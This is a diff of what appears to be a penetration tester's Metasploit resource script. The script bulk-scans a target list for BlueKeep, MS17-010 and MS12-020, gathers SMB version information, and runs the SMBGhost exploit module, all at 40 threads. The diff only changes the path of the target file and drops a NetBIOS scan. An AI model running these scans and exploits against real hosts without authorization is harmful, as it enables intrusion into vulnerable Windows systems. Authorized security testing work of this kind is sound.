@@ -1,41 +1,34 @@
 use auxiliary/scanner/smb/smb_version
-set rhosts file:../targets_smb.txt
+set rhosts file:/home/ptest-2023/enumeration/targets_smb.txt
 set threads 40
 spool smb_version.txt
 run
 spool off
 
 use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
-set rhosts file:../targets_smb.txt
+set rhosts file:/home/ptest-2023/enumeration/targets_smb.txt
 set threads 40
 spool bluekeep_hosts.txt
 run
 spool off
 
 use auxiliary/scanner/smb/smb_ms17_010
-set rhosts file:../targets_smb.txt
+set rhosts file:/home/ptest-2023/enumeration/targets_smb.txt
 set threads 40
 spool MS1710_hosts.txt
 run
 spool off
 
 use exploit/windows/smb/cve_2020_0796_smbghost
-set rhosts file:../targets_smb.txt
+set rhosts file:/home/ptest-2023/enumeration/targets_smb.txt
 set threads 40
 spool SMBGhost_hosts.txt
 run
 spool off
 
 use auxiliary/scanner/rdp/ms12_020_check
-set rhosts file:../targets_smb.txt
+set rhosts file:/home/ptest-2023/enumeration/targets_smb.txt
 set threads 40
 spool MS12_020_hosts.txt
-run
-spool off
-
-use auxiliary/scanner/netbios/nbname
-set rhosts file:../targets_smb.txt
-set threads 40
-spool netbios_hosts.txt
 run
 spool off
